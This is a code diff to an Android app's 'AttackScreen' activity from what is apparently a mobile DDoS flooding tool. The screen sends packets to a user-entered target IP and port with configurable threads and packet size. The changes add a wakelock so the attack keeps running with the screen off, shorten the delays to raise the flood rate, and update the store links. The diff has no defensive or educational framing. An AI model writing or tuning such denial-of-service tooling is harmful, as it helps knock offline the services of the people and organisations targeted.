@@ -5,6 +5,7 @@ import android.content.ActivityNotFoundException;
 import android.content.Intent;
 import android.net.Uri;
 import android.os.Bundle;
+import android.os.PowerManager;
 import android.view.Menu;
 import android.view.MenuItem;
 import android.view.View;
@@ -19,6 +20,7 @@ import java.util.Random;
 public class AttackScreen extends Activity {
     private dosService dosSer = new dosService();
     String Target_Ip;
+    protected PowerManager.WakeLock mWakeLock;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -27,15 +29,17 @@ public class AttackScreen extends Activity {
         Bundle extras = getIntent().getExtras();
         if (extras != null) {
             Target_Ip = extras.getString("Target");
+            this.mWakeLock = ((PowerManager) getSystemService(POWER_SERVICE)).newWakeLock(6, "DOSLock");
         }
     }
 
     public void startClicked(View v) {
+        this.mWakeLock.acquire(600000);
         Spinner Progress = findViewById(R.id.Method);
-        EditText Timeout = (EditText) findViewById(R.id.Timeout);
-        EditText Port_no = (EditText) findViewById(R.id.Port_No);
-        EditText Packet_size = (EditText) findViewById(R.id.Packet_Size);
-        EditText Thread_Count = (EditText) findViewById(R.id.Thread_Count);
+        EditText Timeout = findViewById(R.id.Timeout);
+        EditText Port_no = findViewById(R.id.Port_No);
+        EditText Packet_size = findViewById(R.id.Packet_Size);
+        EditText Thread_Count = findViewById(R.id.Thread_Count);
         final Button b = (Button) v;
 
         String check = null;
@@ -90,7 +94,7 @@ public class AttackScreen extends Activity {
         final byte[] packet = message.getBytes();
         final int method = Progress.getSelectedItemPosition();
         try {
-            this.dosSer.DDOS(Target_Ip, Integer.parseInt(Port_no.getText().toString()), method, Threads, Integer.parseInt(Timeout.getText().toString()), message, 50);
+            this.dosSer.DDOS(Target_Ip, Integer.parseInt(Port_no.getText().toString()), method, Threads, Integer.parseInt(Timeout.getText().toString()), message, 10);
             b.setText(R.string.attackstop);
             new Thread(new Runnable() {
                 public void run() {
@@ -140,11 +144,12 @@ public class AttackScreen extends Activity {
                             b.setText(R.string.attackstart);
                         }
                         try {
-                            Thread.sleep(50);
+                            Thread.sleep(5);
                         } catch (Exception e) {
                             Toast.makeText(AttackScreen.this, "Try Entering smaller values for no of threads and packet size", Toast.LENGTH_LONG).show();
                         }
                     }
+                    AttackScreen.this.mWakeLock.release();
                 }
             }).start();
         } catch (Exception e2) {
@@ -177,12 +182,15 @@ public class AttackScreen extends Activity {
                 }
             case R.id.more_apps_menu_id:
                 try {
-                    startActivity(new Intent("android.intent.action.VIEW", Uri.parse("market://developer?id=Notebook+Inc")));
+                    startActivity(new Intent("android.intent.action.VIEW", Uri.parse("market://developer?id=7665922803421240272")));
                     return true;
                 } catch (ActivityNotFoundException e2) {
-                    startActivity(new Intent("android.intent.action.VIEW", Uri.parse("https://play.google.com/store/apps/developer?id=Notebook+Inc")));
+                    startActivity(new Intent("android.intent.action.VIEW", Uri.parse("https://play.google.com/store/apps/dev?id=7665922803421240272")));
                     return true;
                 }
+            case R.id.credits:
+                Intent intent = new Intent(this, Translations.class);
+                startActivity(intent);
             default:
                 return super.onOptionsItemSelected(item);
         }
